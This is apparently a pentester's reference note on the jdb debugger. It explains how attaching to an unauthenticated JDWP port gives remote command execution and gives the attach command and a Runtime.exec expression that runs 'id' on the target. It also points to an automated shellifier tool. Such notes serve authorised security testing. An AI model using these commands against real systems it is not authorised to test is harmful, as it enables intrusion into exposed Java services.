# jdb

**Tags:** `#jdb` `#jdwp` `#java` `#debugger` `#rce`

The Java Debugger, shipped with the JDK. Its `SocketAttach` connector attaches to any JVM exposing the Java Debug Wire Protocol (JDWP) — which requires no authentication — giving full control of the debugged process. Once attached you can list classes/methods, set breakpoints, and evaluate arbitrary Java expressions in a live thread context, including `java.lang.Runtime.getRuntime().exec(...)` for OS command execution as the app user.

**Source:** Bundled with any JDK (`jdb` on PATH). **Install:** `apt install default-jdk` (Kali) if missing.

```bash
# Attach to a remote JDWP listener
jdb -connect com.sun.jdi.SocketAttach:hostname=<target>,port=8000

# (jdb) evaluate an expression → RCE (readAllBytes needs JVM 9+; see JDWP note for the Java 8 form)
print new java.lang.String(java.lang.Runtime.getRuntime().exec(new String[]{"id"}).getInputStream().readAllBytes())
```

Automated alternative: [[Tools/Web/jdwp-shellifier|jdwp-shellifier]].

---

> [!note] **See also** — [[Services/Web Services/JDWP|JDWP]] — attach to an exposed, unauthenticated JDWP port and drive the JVM to RCE by hand.

---

*Created: 2026-09-24*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
